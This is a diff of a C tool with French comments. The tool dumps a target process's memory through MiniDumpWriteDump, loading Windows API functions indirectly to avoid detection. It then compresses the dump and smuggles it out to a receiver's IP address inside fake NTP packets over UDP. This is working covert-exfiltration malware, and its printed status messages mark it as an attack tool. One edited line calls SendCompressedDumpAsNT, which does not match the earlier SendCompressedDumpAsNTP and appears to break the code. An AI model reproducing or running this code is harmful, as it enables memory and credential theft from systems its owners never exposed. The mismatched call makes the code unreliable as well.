@@ -62,7 +62,8 @@ DWORD GetTargetProcessPID(const wchar_t *targetProcessName) {
 }
 
 // --- Fonction de dump mémoire ---
-// Effectue un dump mémoire du processus cible en utilisant MiniDumpWriteDump (appel indirect déjà présent) et un mapping mémoire temporaire
+// Effectue un dump mémoire du processus cible en utilisant MiniDumpWriteDump (appel indirect déjà présent)
+// et un mapping mémoire temporaire en passant par les appels indirects de kernel32.dll
 BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
     // Chargement de DbgHelp.dll et récupération de MiniDumpWriteDump
     HMODULE hDbgHelp = LoadLibrary(L"DbgHelp.dll");
@@ -77,7 +78,7 @@ BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
         return FALSE;
     }
 
-    // Chargement des fonctions kernel32.dll en mode indirect pour OpenProcess, CreateFileMappingW, MapViewOfFile, UnmapViewOfFile, CloseHandle
+    // Chargement des fonctions kernel32.dll en mode indirect
     HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
     if (!hKernel32) {
         FreeLibrary(hDbgHelp);
@@ -138,7 +139,7 @@ BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
 }
 
 // --- Fonction de compression ---
-// Compresse le buffer à l'aide de zlib
+// Compresse le buffer à l'aide de zlib (ici, l'appel reste direct car zlib n'est pas une API Windows)
 int CompressBuffer(const char *inputBuffer, size_t inputSize, char **compressedBuffer, size_t *compressedSize) {
     uLong bound = compressBound(inputSize);
     *compressedBuffer = (char*)malloc(bound);
@@ -161,9 +162,8 @@ void CreateNTPPacket(const unsigned char payload[8], unsigned char packet[48]) {
     memcpy(packet + 40, payload, 8);
 }
 
-// Envoie un paquet UDP contenant le faux paquet NTP
+// Envoie un paquet UDP contenant le faux paquet NTP en utilisant les fonctions indirectes de ws2_32.dll
 int SendNTPPacket(const char *target_ip, int target_port, const unsigned char payload[8]) {
-    // Chargement des fonctions ws2_32.dll en mode indirect
     HMODULE hWs2_32 = GetModuleHandleW(L"ws2_32.dll");
     if (!hWs2_32)
         return -1;
@@ -300,7 +300,7 @@ int main(void) {
     }
     printf("[+] Compression completed. Compressed size: %zu bytes.\n", compressedSize);
 
-    if (SendCompressedDumpAsNTP(target_ip, target_port, compressedBuffer, compressedSize) != 0) {
+    if (SendCompressedDumpAsNT(target_ip, target_port, compressedBuffer, compressedSize) != 0) {
         printf("[!] Failed to send compressed dump to receiver.\n");
         free(compressedBuffer);
         return 1;
